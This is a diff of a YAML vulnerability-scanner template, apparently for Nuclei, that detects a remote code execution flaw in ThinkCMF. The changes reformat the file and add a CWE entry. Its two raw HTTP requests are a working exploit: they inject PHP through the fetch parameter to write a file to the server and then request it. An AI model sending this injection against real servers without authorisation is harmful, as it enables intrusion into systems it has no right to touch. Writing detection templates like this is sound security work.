@@ -1,5 +1,4 @@
 id: thinkcmf-rce
-
 info:
   name: ThinkCMF - Remote Code Execution
   author: pikpikcu
@@ -10,27 +9,23 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10
-    cwe-id: CWE-77
+    cwe-id: CWE-77,CWE-94
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag intrusive
     max-request: 2
-  tags: thinkcmf,rce,intrusive,vuln
-
+  tags: intrusive,rce,thinkcmf,vuln
 variables:
-  string: "thinkcmf-rce"
-
+  string: thinkcmf-rce
 http:
-  - raw:
+  - matchers:
+      - part: body_2
+        type: word
+        words:
+          - '{{md5(string)}}'
+    raw:
       - |
         GET /index.php?a=fetch&content={{url_encode('<?php file_put_contents(\"{{randstr}}.php\",\"<?php echo md5(\"{{string}}\");unlink(__FILE__);\");')}} HTTP/1.1
         Host: {{Hostname}}
       - |
         GET /{{randstr}}.php HTTP/1.1
         Host: {{Hostname}}
-
-    matchers:
-      - type: word
-        part: body_2
-        words:
-          - '{{md5(string)}}'
-
